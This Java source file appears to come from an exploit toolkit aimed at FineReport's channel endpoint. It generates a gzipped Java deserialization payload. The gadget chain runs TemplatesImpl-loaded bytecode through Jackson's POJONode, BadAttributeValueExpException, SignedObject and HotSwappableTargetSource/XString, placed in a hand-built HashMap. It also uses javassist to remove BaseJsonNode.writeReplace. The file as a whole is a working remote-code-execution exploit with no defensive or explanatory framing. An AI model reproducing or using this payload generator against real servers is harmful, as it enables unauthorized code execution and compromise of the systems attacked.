package com.example.frchannel.payload;

import com.fr.third.fasterxml.jackson.databind.node.POJONode;
import com.fr.third.springframework.aop.target.HotSwappableTargetSource;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.security.SignedObject;
import java.util.HashMap;

public class JacksonSignedObject {

    public static byte[] getPayload(byte[] bytes) throws Exception {
        TemplatesImpl t = utils.getTeml(bytes);
        try {
            CtClass ctClass = ClassPool.getDefault().get("com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            // 将修改后的CtClass加载至当前线程的上下文类加载器中
            ctClass.toClass();
        }
        catch (Exception e){

        }

        POJONode node = new POJONode(utils.makeTemplatesImplAopProxy(t));
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        utils.setFieldValue(val,"val",node);




        SignedObject s = utils.makeSignedObject(val);

        POJONode node2 = new POJONode(s);


        HotSwappableTargetSource h1 = new HotSwappableTargetSource(node2);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));

        HashMap<Object, Object> hashmap = new HashMap<>();
        utils.setFieldValue(hashmap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, h1, h1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, h2, h2, null));
        utils.setFieldValue(hashmap, "table", tbl);


        byte[] ser = utils.serialize(hashmap);
        byte[] payload = utils.GzipCompress(ser);

        return payload;
    }


}
